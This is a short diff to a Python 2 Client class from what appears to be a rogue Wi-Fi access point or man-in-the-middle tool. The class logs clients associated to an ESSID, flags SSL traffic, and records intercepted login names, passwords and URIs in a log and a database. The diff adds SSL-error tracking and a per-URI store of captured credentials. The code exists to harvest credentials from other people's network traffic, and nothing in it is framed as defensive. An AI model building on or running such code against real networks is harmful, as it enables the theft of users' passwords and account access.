@@ -15,7 +15,9 @@ class Client:
     self.posts = []
     self.services = {}
     self.data = {}
+    self.ssl_error = False
     self.ssl = False
+    self.credentials = {}
     
     self.app.log("[+] %s associated to %s"%(ctxt(bssid,GREEN), ctxt(self.vif.essid, GREEN)))
     
@@ -29,12 +31,17 @@ class Client:
   def get_interface(self):
     return self.vif
   
+  def ssl_traffic_error(self):
+    self.ssl_error = True
+    
   def ssl_traffic(self):
     self.ssl = True
   
   def log_login(self, user):
     self.app.log('[+] %s %s login: %s, password: %s, uri: %s'%(ctxt('[*]', RED), ctxt(self.bssid, GREEN), ctxt(user['login'], RED),ctxt(user['password'], RED), ctxt(user['uri'], RED)))
     self.db.new_client_credentials(user['login'], user['password'], user['uri'], self.bssid)
+    if not self.credentials.has_key(user['uri']):
+      self.credentials[user['uri']] = user
     
   def register_post(self, uri, path):
     self.posts.append({
